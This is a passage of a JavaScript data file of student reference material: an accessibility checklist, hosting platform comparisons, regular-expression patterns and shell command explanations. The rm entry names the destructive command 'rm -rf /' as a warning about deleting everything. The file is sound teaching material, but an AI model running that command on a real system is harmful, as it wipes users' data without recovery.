        { check: 'UI components (buttons) contrast >= 3:1', why: 'WCAG AA.', test: 'Check button vs background.' },
        { check: 'Color is not the only indicator', why: 'Color-blind users need alternatives.', test: 'Convert page to grayscale. Still usable?' },
        { check: 'Focus indicator visible + high contrast', why: 'Keyboard users need to see focus.', test: 'Tab through. Is focus visible?' },
        { check: 'Error states have text + color (not just color)', why: 'Color alone fails for color-blind users.', test: 'View error state. Color removed — still understood?' },
        { check: 'Links distinguishable from text (color + underline or other)', why: 'WCAG 1.4.1 — color alone insufficient.', test: 'Print page in grayscale. Links visible?' },
      ],
    },
    {
      category: 'Keyboard accessibility',
      items: [
        { check: 'All interactive elements keyboard-accessible', why: 'Keyboard users must be able to use everything.', test: 'Unplug mouse. Try to use entire page.' },
        { check: 'Tab order is logical (typically left-to-right, top-to-bottom)', why: 'Confusing tab order disorients users.', test: 'Tab through entire page. Make sense?' },
        { check: 'No keyboard traps (must be able to leave any element)', why: 'Keyboard users can\'t use other parts of page.', test: 'Tab into modal. Can you tab out without closing?' },
        { check: 'Skip links work', why: 'Skip nav for keyboard users.', test: 'Tab to skip link. Activate. Did focus move?' },
        { check: 'Custom widgets keyboard-accessible', why: 'Custom dropdowns + sliders need handling.', test: 'Try keyboard on each custom widget.' },
        { check: 'Modal dialogs trap focus', why: 'Focus shouldn\'t escape modal until closed.', test: 'Open modal. Tab cycles within modal only.' },
        { check: 'Modal closes on Escape key', why: 'Standard expectation.', test: 'Open modal. Press Escape. Closes?' },
      ],
    },
    {
      category: 'Forms',
      items: [
        { check: 'All inputs have associated <label>', why: 'Screen readers + click-to-focus.', test: 'Click label. Does input focus?' },
        { check: 'Required fields marked', why: 'Users need to know what\'s required.', test: 'Look for asterisk, "required", or aria-required.' },
        { check: 'Error messages clearly communicated', why: 'Users need to know what went wrong.', test: 'Submit invalid form. Error visible + announced?' },
        { check: 'Error messages associated with fields (aria-describedby)', why: 'Screen reader links input + error.', test: 'View input. Is aria-describedby set after error?' },
        { check: 'Form submit not required for all interaction', why: 'Some flows should be inline.', test: 'Does form require submit for every action?' },
        { check: 'Submit button clearly labeled', why: 'Users need to know what submitting does.', test: 'Button text says "Submit" or specific action.' },
        { check: 'Form validation doesn\'t lose user input', why: 'Re-entering data is frustrating.', test: 'Submit invalid. Errors shown but data preserved?' },
        { check: 'Fields grouped logically (use fieldsets)', why: 'Helps users understand context.', test: 'Related fields grouped together?' },
      ],
    },
    {
      category: 'ARIA + semantics',
      items: [
        { check: 'Use native HTML when possible', why: 'Native elements get built-in semantics.', test: 'Are <div onclick> patterns used? Should be <button>.' },
        { check: 'Custom widgets have proper ARIA roles', why: 'Screen readers need to know what custom widget is.', test: 'Inspect custom elements. Are roles set?' },
        { check: 'aria-label or aria-labelledby provides accessible name', why: 'Icon-only buttons need labels.', test: 'Try icon buttons. What does screen reader say?' },
        { check: 'Dynamic content uses aria-live', why: 'Updates should be announced.', test: 'Add a new chat message. Is it announced?' },
        { check: 'Loading states announced', why: 'Users need to know wait is expected.', test: 'Trigger loading. Is "loading" announced?' },
        { check: 'aria-hidden NOT on focusable elements', why: 'Creates "ghost focus" — focusable but not announced.', test: 'Check focused elements. Any aria-hidden?' },
        { check: 'Tab list uses ARIA correctly', why: 'Custom tabs need proper roles/keyboard.', test: 'Try arrow keys on tabs. Should navigate.' },
      ],
    },
    {
      category: 'Mobile + touch',
      items: [
        { check: 'Touch targets at least 44x44px', why: 'WCAG AAA target size.', test: 'Inspect button sizes.' },
        { check: 'Sufficient spacing between targets', why: 'Avoid accidental clicks.', test: 'Are buttons close together?' },
        { check: 'Page responsive at 320px wide', why: 'WCAG 1.4.10.', test: 'Resize browser to 320px.' },
        { check: 'No horizontal scroll at 320px', why: 'Confusing on mobile.', test: 'Check above test for scroll bars.' },
        { check: 'Pinch-to-zoom not disabled', why: 'Low-vision users need to zoom.', test: 'Check meta viewport. No user-scalable=no.' },
        { check: 'Orientation works in both portrait + landscape', why: 'Users may rotate device.', test: 'Rotate device.' },
        { check: 'Hover-only content has alternative on touch', why: 'Touch devices have no hover.', test: 'On phone, try to access "hover" content.' },
      ],
    },
    {
      category: 'Text + reading',
      items: [
        { check: 'Body text >= 16px', why: 'Smaller is hard to read for many users.', test: 'Inspect body font-size.' },
        { check: 'Line height >= 1.5 for paragraph text', why: 'WCAG 1.4.12.', test: 'Check CSS line-height on <p>.' },
        { check: 'Letter spacing 0.12em or default', why: 'WCAG 1.4.12.', test: 'Check letter-spacing.' },
        { check: 'Word spacing 0.16em or default', why: 'WCAG 1.4.12.', test: 'Check word-spacing.' },
        { check: 'Paragraph spacing 2x font size', why: 'WCAG 1.4.12.', test: 'Check margin/padding between <p>.' },
        { check: 'Text resizable to 200% without breaking layout', why: 'WCAG 1.4.4.', test: 'Browser zoom to 200%. Layout works?' },
        { check: 'Text contrast preserved at 200% zoom', why: 'Should remain readable.', test: 'Same test as above.' },
      ],
    },
    {
      category: 'Animation + motion',
      items: [
        { check: 'No flashing >3 times per second', why: 'Risk of seizures (WCAG 2.3.1).', test: 'Check for fast flashing.' },
        { check: 'Animation respects prefers-reduced-motion', why: 'WCAG 2.3.3.', test: 'Enable OS reduced motion. Animations stop?' },
        { check: 'Auto-rotating content has pause control', why: 'WCAG 2.2.2.', test: 'Sliders + carousels have play/pause?' },
        { check: 'No surprise content changes on input', why: 'WCAG 3.2.2.', test: 'Try various inputs. Anything jumps unexpectedly?' },
      ],
    },
    {
      category: 'Testing tools',
      items: [
        { check: 'Lighthouse audit (Chrome DevTools)', why: 'Automated check of many rules.', test: 'Run Lighthouse. Aim for 90+ accessibility score.' },
        { check: 'axe-core extension', why: 'More detailed audit.', test: 'Install axe DevTools. Run on each page.' },
        { check: 'WAVE (WebAIM)', why: 'Web-based audit.', test: 'Visit wave.webaim.org. Enter URL.' },
        { check: 'Screen reader testing', why: 'Real test with assistive tech.', test: 'Use NVDA (Windows) or VoiceOver (Mac).' },
        { check: 'Keyboard-only testing', why: 'Direct test of accessibility.', test: 'Unplug mouse. Use page.' },
        { check: 'Mobile screen reader testing', why: 'Different from desktop.', test: 'Use TalkBack (Android) or VoiceOver (iOS).' },
        { check: 'Color blind simulator', why: 'Test color-only meaning.', test: 'Chrome DevTools → Rendering → Emulate vision deficiencies.' },
      ],
    },
  ];

  // ─── Deployment + hosting guide (verbose) ───────────────────────
  var DEPLOYMENT_GUIDE = [
    {
      platform: 'GitHub Pages',
      type: 'Static hosting',
      cost: 'Free for public repos',
      bestFor: 'Static HTML/CSS/JS sites, portfolios, documentation, demos',
      pros: [
        'Free and reliable',
        'Built into GitHub workflow',
        'Custom domains supported',
        'Auto-deploy on push',
        'HTTPS included',
      ],
      cons: [
        'Static only (no backend)',
        'Public repos required for free tier',
        'Build size limits (1GB)',
        '100GB bandwidth per month',
      ],
      setup: [
        'Push site files to GitHub repo',
        'Settings → Pages → Source: main branch',
        'Wait 1-2 minutes for deploy',
        'Visit username.github.io/repo-name',
      ],
      forStudents: 'Best first deploy. Free, easy, professional URL.',
      example: 'github.com/student-name/my-portfolio → student-name.github.io/my-portfolio',
    },
    {
      platform: 'Netlify',
      type: 'Static + serverless functions',
      cost: 'Generous free tier',
      bestFor: 'JAMstack sites, React/Vue/Svelte apps, sites with simple backend needs',
      pros: [
        'Drag-and-drop deploy or git-based',
        'Free SSL certificates',
        'Custom domains',
        'Serverless functions (100K/month free)',
        'Form handling built-in',
        'Identity (auth) built-in',
        'Branch previews',
        'Easy rollback to previous deploys',
      ],
      cons: [
        '100GB bandwidth per month on free tier',
        'Builds limited to 300 minutes/month free',
        'Some advanced features need paid plan',
      ],
      setup: [
        'Sign up at netlify.com',
        'Connect GitHub account',
        'Pick repo, configure build command and publish directory',
        'Deploy completes in 1-3 minutes',
        'Configure custom domain in Settings',
      ],
      forStudents: 'Great when site needs a contact form or simple auth.',
      example: 'GitHub repo → auto-deploy → my-site.netlify.app',
    },
    {
      platform: 'Vercel',
      type: 'Static + serverless + edge functions',
      cost: 'Free for personal projects',
      bestFor: 'Next.js apps (made by Vercel), modern React frameworks, high-performance sites',
      pros: [
        'Best-in-class Next.js support',
        'Edge functions globally distributed',
        'Free SSL',
        'Preview deployments per PR',
        'Analytics included',
        'Image optimization automatic',
        'Fast builds with smart caching',
      ],
      cons: [
        'Paid plans expensive for commercial use',
        '100GB bandwidth free tier',
        'Some lock-in to Vercel-specific features',
      ],
      setup: [
        'Sign up at vercel.com',
        'Import GitHub repo',
        'Auto-detects framework',
        'Deploy on each push',
      ],
      forStudents: 'Best choice for Next.js / React projects.',
      example: 'my-app.vercel.app with auto SSL',
    },
    {
      platform: 'Cloudflare Pages',
      type: 'Static + Workers (edge functions)',
      cost: 'Generous free tier',
      bestFor: 'High-traffic static sites, edge-rendered apps',
      pros: [
        'Unlimited bandwidth (no metering)',
        '500 builds per month free',
        'Cloudflare CDN included (global)',
        'Free SSL',
        'Workers for serverless (100K req/day free)',
        'No cold starts',
      ],
      cons: [
        '25MB per file limit',
        'Newer than competitors',
        'Workers have different API than Lambda',
      ],
      setup: [
        'Cloudflare account (free)',
        'Pages → Create project → Connect to Git',
        'Configure build settings',
        'Deploy',
      ],
      forStudents: 'Best for sites expecting traffic. Unlimited bandwidth.',
      example: 'Used by AlloFlow CDN itself!',
    },
    {
      platform: 'Firebase Hosting',
      type: 'Static + Firebase ecosystem',
      cost: 'Free tier (Spark plan)',
      bestFor: 'Sites using Firebase services (Auth, Firestore, Functions)',
      pros: [
        'Tight integration with Firebase Auth/DB',
        '10GB hosting / 360MB/day bandwidth free',
        'Custom domains + SSL',
        'CDN automatic',
        'Preview channels',
      ],
      cons: [
        'CLI required for deploy (no drag-drop)',
        'Free tier bandwidth is modest',
        'Lock-in to Firebase if using services',
      ],
      setup: [
        'npm install -g firebase-tools',
        'firebase login',
        'firebase init hosting',
        'firebase deploy',
      ],
      forStudents: 'If your app uses Firebase Auth/Firestore, host here.',
      example: 'my-project.web.app',
    },
    {
      platform: 'Heroku',
      type: 'Full-stack platform-as-a-service',
      cost: 'No longer free (had to discontinue)',
      bestFor: 'Backend apps (Node, Python, Ruby), full-stack apps with databases',
      pros: [
        'Easy deploy via git push',
        'Add-ons for databases, caching, etc.',
        'Multiple languages supported',
        'Logs and metrics included',
      ],
      cons: [
        'Paid only since Nov 2022',
        'Sleeps after inactivity on cheapest plan',
        'Expensive for production',
      ],
      setup: [
        'heroku create',
        'git push heroku main',
        'heroku open',
      ],
      forStudents: 'Consider Render or Railway as free alternatives.',
      example: 'my-app.herokuapp.com',
    },
    {
      platform: 'Render',
      type: 'Static + backend + databases',
      cost: 'Free static hosting, $7/month for backends',
      bestFor: 'Backend apps, replacing Heroku for hobby projects',
      pros: [
        'Free static sites with SSL',
        'Free PostgreSQL databases (90-day expiry)',
        'Backend services from $7/mo',
        'Auto-deploy from Git',
        'No sleeping on paid plans',
      ],
      cons: [
        'Backend not free',
        'Free DBs expire after 90 days',
      ],
      setup: [
        'Sign up at render.com',
        'New → Web Service or Static Site',
        'Connect repo',
        'Configure and deploy',
      ],
      forStudents: 'Best free static site alternative if you need form handling.',
      example: 'my-app.onrender.com',
    },
    {
      platform: 'Railway',
      type: 'Full-stack with usage-based pricing',
      cost: '$5 credit free, then pay-as-you-go',
      bestFor: 'Backend apps, databases, full-stack',
      pros: [
        'Easy deploy from GitHub',
        'Databases (Postgres, MySQL, Redis) included',
        'No cold starts',
        'Simple pricing',
      ],
      cons: [
        'Free trial credit limited',
        'No long-term free tier',
      ],
      setup: [
        'Sign up at railway.app',
        'New Project → Deploy from GitHub',
        'Add database services as needed',
      ],
      forStudents: 'Try after free trial of others. Good for full-stack class projects.',
      example: 'my-app.up.railway.app',
    },
    {
      platform: 'AWS Amplify',
      type: 'Full-stack on AWS',
      cost: 'Free tier (12 months), then pay',
      bestFor: 'Production apps needing AWS services',
      pros: [
        'AWS scale and reliability',
        'CI/CD pipelines',
        'Auth (Cognito), DBs (DynamoDB) integrated',
        'GraphQL API generation',
      ],
      cons: [
        'Steep learning curve',
        'Costs surprising if usage spikes',
        'AWS console is complex',
      ],
      setup: [
        'AWS account (free tier)',
        'amplify cli install',
        'amplify init',
        'amplify push',
      ],
      forStudents: 'Skip until you need AWS specifically.',
      example: 'main.d1234.amplifyapp.com',
    },
    {
      platform: 'Custom domain setup',
      type: 'Add a real domain to your site',
      cost: '$10-15/year for domain',
      registrars: ['Namecheap', 'Google Domains (now Squarespace)', 'Porkbun', 'Cloudflare Registrar (at cost)'],
      steps: [
        'Buy domain at registrar',
        'In hosting platform, add custom domain',
        'Hosting gives you DNS records to add',
        'In registrar, add the DNS records (A record or CNAME)',
        'Wait 5-30 minutes for DNS propagation',
        'SSL certificate auto-issued by hosting platform',
      ],
      tips: [
        '.com is most professional',
        '.dev / .app / .io for tech projects',
        'Avoid hyphens and numbers',
        'Keep it short and memorable',
        'Use Cloudflare for DNS (free, fast)',
      ],
      forStudents: 'Once you have a portfolio, get yourname.com or yourname.dev.',
    },
    {
      platform: 'CI/CD pipelines (GitHub Actions)',
      type: 'Automation for build/test/deploy',
      cost: '2000 minutes/month free for public repos',
      whatItDoes: 'Runs scripts automatically when code is pushed',
      uses: [
        'Run tests on every PR',
        'Build site and deploy on merge to main',
        'Lint code and check formatting',
        'Run security audits',
        'Send notifications',
        'Generate documentation',
      ],
      setup: [
        'Create .github/workflows/deploy.yml',
        'Define triggers (on: push, on: pull_request)',
        'Define jobs (build, test, deploy)',
        'Use existing actions or write custom steps',
      ],
      forStudents: 'Start with one action: test on PR. Build from there.',
      example: 'See actions.github.com for templates',
    },
    {
      platform: 'Performance + monitoring',
      type: 'Watch your deployed site',
      tools: [
        { name: 'Google Analytics', purpose: 'See who visits, what pages', cost: 'Free', notes: 'Privacy concerns; consider Plausible or Umami instead' },
        { name: 'Plausible', purpose: 'Privacy-friendly analytics', cost: '$9/mo+', notes: 'No cookies, GDPR-safe' },
        { name: 'Umami', purpose: 'Self-hosted analytics', cost: 'Free (self-host)', notes: 'Open source' },
        { name: 'Sentry', purpose: 'Error tracking', cost: 'Free tier 5K errors/mo', notes: 'See real errors users hit' },
        { name: 'LogRocket', purpose: 'Session replay', cost: 'Paid', notes: 'See exactly what user did' },
        { name: 'Lighthouse CI', purpose: 'Performance budgets', cost: 'Free', notes: 'Catch regressions' },
        { name: 'WebPageTest', purpose: 'Detailed perf analysis', cost: 'Free', notes: 'Run from real devices/locations' },
      ],
      forStudents: 'Start with one error tracker (Sentry free tier). Add analytics later.',
    },
  ];

  // ─── Regular expressions reference (verbose) ────────────────────
  var REGEX_REFERENCE = [
    {
      pattern: '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$',
      name: 'Email validation (basic)',
      matches: 'user@example.com, hello+test@gmail.com',
      doesNotMatch: 'invalid, @nodomain, user@',
      breakdown: '^ = start, [chars]+ = one or more allowed chars, @ literal, .[A-Za-z]{2,} = TLD with 2+ chars, $ = end',
      gotchas: 'Real email validation is hard. Use this for basic format only. Verify by sending an email.',
      example: '/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$/.test(input)',
    },
    {
      pattern: '^\\d{3}-\\d{3}-\\d{4}$',
      name: 'US phone number (XXX-XXX-XXXX)',
      matches: '555-867-5309, 207-555-0123',
      doesNotMatch: '555.867.5309, 5558675309, +1-555-867-5309',
      breakdown: '\\d = digit, {3} = exactly three, - literal hyphen',
      gotchas: 'Too strict for real input. Strip non-digits first: input.replace(/\\D/g, "")',
      example: 'Use to normalize, not to reject',
    },
    {
      pattern: '^\\d{5}(-\\d{4})?$',
      name: 'US ZIP code (5 or 9 digit)',
      matches: '04101, 04101-1234',
      doesNotMatch: 'ABCDE, 1234, 12345-67',
      breakdown: '(-\\d{4})? = optional group: hyphen then 4 digits',
      gotchas: 'Other countries use different formats. Check user location.',
    },
    {
      pattern: '^https?:\\/\\/',
      name: 'URL starts with http(s)',
      matches: 'http://example.com, https://test.org',
      doesNotMatch: 'example.com, ftp://files.example.com',
      breakdown: 's? = optional s, \\/\\/ = escaped slashes',
      gotchas: 'Forgetting to escape / works in JS but not all flavors',
    },
    {
      pattern: '^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[!@#$%^&*])[A-Za-z\\d!@#$%^&*]{8,}$',
      name: 'Strong password',
      matches: 'MyP@ss123, Hello!World99',
      doesNotMatch: 'password, abc123, ALLCAPS!',
      breakdown: '(?=.*X) = positive lookahead requiring X somewhere; 8,} = 8 or more total',
      gotchas: 'NIST now recommends length > complexity. 12+ chars beats complex 8.',
      example: 'But still, the visual rules teach the lookahead pattern',
    },
    {
      pattern: '^\\d{4}-(0[1-9]|1[0-2])-(0[1-9]|[12]\\d|3[01])$',
      name: 'ISO date YYYY-MM-DD',
      matches: '2024-01-15, 2024-12-31',
      doesNotMatch: '2024-13-01 (month 13), 2024-02-30 (Feb 30 — but regex accepts it!)',
      breakdown: 'Month 01-09 or 10-12; day 01-09, 10-29, or 30-31',
      gotchas: 'Regex can\'t validate Feb 30 / leap years. Use Date.parse and check.',
    },
    {
      pattern: '\\b\\w+\\b',
      name: 'Match all words',
      matches: 'Each word in "Hello world!" → Hello, world',
      breakdown: '\\b = word boundary, \\w = word char [A-Za-z0-9_], + = one or more',
      gotchas: '\\w does NOT include hyphen or apostrophe. "don\'t" matches as don and t.',
      example: 'const words = text.match(/\\b\\w+\\b/g);',
    },
    {
      pattern: '<[^>]+>',
      name: 'Strip HTML tags (DANGEROUS)',
      matches: '<p>, </div>, <img src="x">',
      gotchas: 'DO NOT use to sanitize HTML. Use DOMPurify. Regex cannot safely parse HTML.',
      example: 'For visual stripping in trusted content only: html.replace(/<[^>]+>/g, "")',
    },
    {
      pattern: '\\s+',
      name: 'One or more whitespace',
      matches: 'spaces, tabs, newlines',
      breakdown: '\\s = whitespace, + = one or more',
      example: 'text.split(/\\s+/) → array of words',
      common: 'Collapse multiple spaces: text.replace(/\\s+/g, " ")',
    },
    {
      pattern: '^\\s+|\\s+$',
      name: 'Leading or trailing whitespace',
      matches: 'spaces at start or end',
      breakdown: '^\\s+ = whitespace at start, | OR, \\s+$ = whitespace at end',
      example: 'text.replace(/^\\s+|\\s+$/g, "") — but use .trim() instead',
    },
    {
      pattern: '(\\d+)\\.(\\d+)',
      name: 'Decimal numbers (capture groups)',
      matches: '3.14, 100.5',
      breakdown: '(\\d+) = group 1 (digits before .), \\. = literal dot, (\\d+) = group 2',
      example: '"price 3.99".match(/(\\d+)\\.(\\d+)/) → ["3.99", "3", "99"]',
    },
    {
      pattern: '#[0-9a-fA-F]{6}\\b',
      name: 'Hex color code (6-digit)',
      matches: '#ff0000, #2A2a2A',
      doesNotMatch: '#fff (3-digit), rgb(255,0,0)',
      breakdown: '# literal, [0-9a-fA-F] = hex char, {6} = exactly 6',
      example: 'Find all colors in CSS: css.match(/#[0-9a-fA-F]{6}\\b/g)',
    },
    {
      pattern: '\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}',
      name: 'ISO timestamp (without timezone)',
      matches: '2024-01-15T14:30:00',
      breakdown: 'Date, T separator, time',
      gotchas: 'For full ISO 8601 add (\\.\\d+)?(Z|[+-]\\d{2}:\\d{2})?',
    },
    {
      pattern: '[A-Z][a-z]+',
      name: 'Capitalized word',
      matches: 'Hello, World, JavaScript',
      doesNotMatch: 'HTML (all caps), hello (no caps)',
      breakdown: '[A-Z] = one uppercase, [a-z]+ = one or more lowercase',
      example: 'Find proper nouns (approximately): text.match(/\\b[A-Z][a-z]+\\b/g)',
    },
    {
      pattern: '\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b',
      name: 'IPv4 address (loose)',
      matches: '192.168.1.1, 10.0.0.0',
      doesNotMatch: '256.1.1.1 is matched! Range not validated.',
      gotchas: 'For strict validation, validate each octet ≤ 255 in code, not regex',
    },
    {
      pattern: '^[a-z0-9-]+$',
      name: 'URL slug (kebab-case)',
      matches: 'my-blog-post, the-quick-fox-2024',
      doesNotMatch: 'My Blog Post (spaces, capitals)',
      example: 'function toSlug(s) { return s.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, ""); }',
    },
    {
      flags: 'Flags reference',
      g: 'Global — find all matches, not just first',
      i: 'Case insensitive',
      m: 'Multiline — ^ and $ match each line, not whole string',
      s: 'Dotall — . matches newlines',
      u: 'Unicode — proper handling of unicode chars',
      y: 'Sticky — match starting at lastIndex only',
      example: '/hello/gi → all "hello" case-insensitive',
    },
    {
      special: 'Special characters reference',
      list: [
        { char: '.', meaning: 'Any character (except newline, unless /s flag)' },
        { char: '*', meaning: 'Zero or more of previous' },
        { char: '+', meaning: 'One or more of previous' },
        { char: '?', meaning: 'Zero or one (makes optional)' },
        { char: '|', meaning: 'OR (alternation)' },
        { char: '^', meaning: 'Start of string (or line with /m)' },
        { char: '$', meaning: 'End of string (or line with /m)' },
        { char: '\\b', meaning: 'Word boundary' },
        { char: '\\d', meaning: 'Digit [0-9]' },
        { char: '\\D', meaning: 'Non-digit' },
        { char: '\\w', meaning: 'Word char [A-Za-z0-9_]' },
        { char: '\\W', meaning: 'Non-word char' },
        { char: '\\s', meaning: 'Whitespace' },
        { char: '\\S', meaning: 'Non-whitespace' },
        { char: '[abc]', meaning: 'Any of a, b, c' },
        { char: '[^abc]', meaning: 'NOT a, b, or c' },
        { char: '[a-z]', meaning: 'Range a through z' },
        { char: '{3}', meaning: 'Exactly 3' },
        { char: '{3,}', meaning: '3 or more' },
        { char: '{3,5}', meaning: '3 to 5' },
        { char: '(...)', meaning: 'Capture group' },
        { char: '(?:...)', meaning: 'Non-capturing group' },
        { char: '(?=...)', meaning: 'Positive lookahead' },
        { char: '(?!...)', meaning: 'Negative lookahead' },
        { char: '(?<=...)', meaning: 'Positive lookbehind' },
        { char: '(?<!...)', meaning: 'Negative lookbehind' },
      ],
    },
    {
      tips: 'Pro tips',
      list: [
        'Test your regex at regex101.com — explains what each part does',
        'Use /x flag in other languages for verbose regex with comments',
        'Avoid catastrophic backtracking: nested quantifiers (a+)+ on long input can hang',
        'Compile once if reusing: const r = /pattern/; — don\'t recompile in loop',
        'For complex parsing (HTML, JSON, code), don\'t use regex — use a real parser',
        'Comments help: split into pieces with // explanations',
        'Test the negative cases — what should NOT match',
      ],
    },
  ];

  // ─── Shell + CLI reference (verbose) ────────────────────────────
  var SHELL_REFERENCE = [
    {
      command: 'ls',
      purpose: 'List directory contents',
      flags: [
        { flag: '-l', does: 'Long format (permissions, size, date)' },
        { flag: '-a', does: 'Show hidden files (start with .)' },
        { flag: '-h', does: 'Human-readable sizes (KB, MB, GB)' },
        { flag: '-t', does: 'Sort by modified time (newest first)' },
        { flag: '-r', does: 'Reverse order' },
      ],
      examples: [
        'ls -lah → long format with hidden + human sizes',
        'ls -lt → newest files first',
        'ls *.js → list only JS files (glob)',
      ],
      onWindows: 'dir (cmd) or ls works in PowerShell (alias for Get-ChildItem)',
    },
    {
      command: 'cd',
      purpose: 'Change directory',
      examples: [
        'cd ~ → home directory',
        'cd .. → parent directory',
        'cd - → previous directory',
        'cd /absolute/path → absolute',
        'cd ./relative → relative',
      ],
      gotcha: 'Drive letter required on Windows: cd C:\\Users',
    },
    {
      command: 'pwd',
      purpose: 'Print working directory (where am I?)',
      example: 'pwd → /Users/aaron/projects/myapp',
      onWindows: 'cd (without arg) or Get-Location',
    },
    {
      command: 'mkdir',
      purpose: 'Make directory',
      flags: [
        { flag: '-p', does: 'Create parents if needed (no error if exists)' },
      ],
      examples: [
        'mkdir myproject',
        'mkdir -p src/components/buttons → creates all 3 levels',
      ],
    },
    {
      command: 'rm',
      purpose: 'Remove file',
      flags: [
        { flag: '-r', does: 'Recursive (for directories)' },
        { flag: '-f', does: 'Force (no confirmation, ignore missing)' },
        { flag: '-i', does: 'Interactive (confirm each)' },
      ],
      examples: [
        'rm file.txt',
        'rm -rf node_modules → delete directory and all contents',
        'rm *.tmp → delete by pattern',
      ],
      WARNING: 'rm -rf / would delete everything. Be very careful. No undo.',
    },
    {
      command: 'cp',
      purpose: 'Copy file or directory',
      flags: [
        { flag: '-r', does: 'Recursive (for directories)' },
        { flag: '-i', does: 'Interactive (confirm overwrite)' },
      ],
      examples: [
        'cp source.txt dest.txt',
        'cp -r src/ backup/',
        'cp file.js{,.bak} → bash brace expansion: copies to file.js.bak',
      ],
    },
    {
      command: 'mv',
      purpose: 'Move or rename file',
      examples: [
        'mv old.txt new.txt → rename',
        'mv file.txt ../other/ → move to other directory',
        'mv *.log archive/ → move all .log files',
      ],
    },
    {
      command: 'cat',
      purpose: 'Print file to stdout',
      examples: [
        'cat README.md → print whole file',
        'cat file1.txt file2.txt → concatenate',
        'cat > new.txt → write from stdin (Ctrl+D to end)',
      ],
      onWindows: 'type or Get-Content',
    },
    {
      command: 'less',
      purpose: 'View file with paging',
      keys: [
        { key: 'q', does: 'Quit' },
        { key: 'Space', does: 'Next page' },
        { key: 'b', does: 'Previous page' },
        { key: '/text', does: 'Search forward' },
        { key: 'n', does: 'Next match' },
        { key: 'g', does: 'Top of file' },
        { key: 'G', does: 'End of file' },
      ],
      examples: ['less long-log.txt'],
    },
    {
      command: 'grep',
      purpose: 'Search file contents',
      flags: [
        { flag: '-i', does: 'Case insensitive' },
        { flag: '-r', does: 'Recursive into directories' },
        { flag: '-n', does: 'Show line numbers' },
        { flag: '-v', does: 'Invert match (lines NOT matching)' },
        { flag: '-l', does: 'Only file names with matches' },
        { flag: '-c', does: 'Count matches per file' },
        { flag: '-E', does: 'Extended regex' },
      ],
      examples: [
        'grep "TODO" *.js → find TODOs',
        'grep -rni "function" src/ → recursive, line numbers, case insensitive',
        'grep -v "comment" file → all lines NOT containing "comment"',
      ],
      modern: 'ripgrep (rg) is faster: rg "pattern" — respects .gitignore by default',
    },
    {
      command: 'find',
      purpose: 'Find files by criteria',
      examples: [
        'find . -name "*.js" → all JS files recursively',
        'find . -type d -name "node_modules" → directories named node_modules',
        'find . -mtime -7 → modified in last 7 days',
        'find . -size +10M → larger than 10MB',
        'find . -name "*.tmp" -delete → find and delete',
        'find . -name "*.js" -exec grep "TODO" {} + → search inside found files',
      ],
    },
    {
      command: 'chmod',
      purpose: 'Change file permissions (Unix)',
      modes: [
        { num: '755', means: 'rwxr-xr-x (typical executable)' },
        { num: '644', means: 'rw-r--r-- (typical file)' },
        { num: '600', means: 'rw------- (private, like SSH key)' },
        { num: '+x', means: 'Add execute permission' },
      ],
      examples: [
        'chmod +x script.sh → make executable',
        'chmod 644 file.txt → rw for owner, r for others',
        'chmod 700 ~/.ssh → only owner can access',
      ],
    },
    {
      command: 'curl',
      purpose: 'Make HTTP request from command line',
      flags: [
        { flag: '-X METHOD', does: 'HTTP method (GET, POST, etc.)' },
        { flag: '-H "Header: value"', does: 'Custom header' },
        { flag: '-d "data"', does: 'POST body' },
        { flag: '-o file', does: 'Save to file' },
        { flag: '-i', does: 'Include headers in output' },
        { flag: '-L', does: 'Follow redirects' },
        { flag: '-s', does: 'Silent (no progress)' },
      ],
      examples: [
        'curl https://api.example.com/data',
        'curl -X POST -H "Content-Type: application/json" -d \'{"name":"hi"}\' https://api.example.com',
        'curl -o file.zip https://example.com/file.zip',
      ],
    },
    {
      command: 'wget',
      purpose: 'Download file from URL',
      examples: [
        'wget https://example.com/file.zip',
        'wget -r https://example.com/ → mirror site',
        'wget -c URL → continue interrupted download',
      ],
      vs: 'curl is more flexible for APIs. wget is simpler for file downloads.',
    },
    {
      command: 'tar',
      purpose: 'Archive files',
      flags: [
        { flag: '-c', does: 'Create archive' },
        { flag: '-x', does: 'Extract archive' },
        { flag: '-z', does: 'Gzip compression' },
        { flag: '-v', does: 'Verbose (show files)' },
        { flag: '-f file', does: 'Archive file name' },
      ],
      examples: [
        'tar -czvf backup.tar.gz folder/ → create',
        'tar -xzvf backup.tar.gz → extract',
        'tar -tvf backup.tar.gz → list contents without extracting',
      ],
      mnemonic: 'tar -czvf or -xzvf — eXtract or Create, Z gzip, V verbose, F file',
    },
    {
      command: 'ps',
      purpose: 'Show running processes',
      examples: [
        'ps → your shell\'s processes',
        'ps aux → all processes (BSD style)',
        'ps aux | grep node → find node processes',
      ],
      modern: 'htop or btop is interactive and prettier',
    },
    {
      command: 'kill',
      purpose: 'Stop a process',
      examples: [
        'kill 1234 → send TERM signal to PID 1234',
        'kill -9 1234 → force kill (SIGKILL)',
        'killall node → kill all node processes by name',
        'pkill -f "pattern" → kill by command pattern',
      ],
    },
    {
      command: 'history',
      purpose: 'Show command history',
      tips: [
        'Up arrow: previous command',
        'Ctrl+R: reverse search history',
        '!! : run last command',
        '!42 : run command #42 from history',
        '!grep : run most recent command starting with grep',
      ],
    },
    {
      command: 'echo',
      purpose: 'Print text',
      examples: [
        'echo "hello"',
        'echo $PATH → print env var',
        'echo "hi" > file.txt → write to file (overwrite)',
        'echo "hi" >> file.txt → append',
      ],
    },
    {
      command: 'env / export',
      purpose: 'Environment variables',
      examples: [
        'env → list all env vars',
        'echo $HOME → print HOME',
        'export API_KEY=secret → set for session',
        'export PATH=$PATH:/new/dir → append to PATH',
      ],
      persistent: 'For permanent, add export lines to ~/.bashrc or ~/.zshrc',
    },
    {
      command: 'Piping and redirection',
      patterns: [
        { syntax: 'cmd1 | cmd2', does: 'Pipe cmd1 stdout to cmd2 stdin' },
        { syntax: 'cmd > file', does: 'Redirect stdout to file (overwrite)' },
        { syntax: 'cmd >> file', does: 'Append stdout to file' },
        { syntax: 'cmd 2> file', does: 'Redirect stderr to file' },
        { syntax: 'cmd 2>&1', does: 'Merge stderr into stdout' },
        { syntax: 'cmd > /dev/null', does: 'Discard output' },
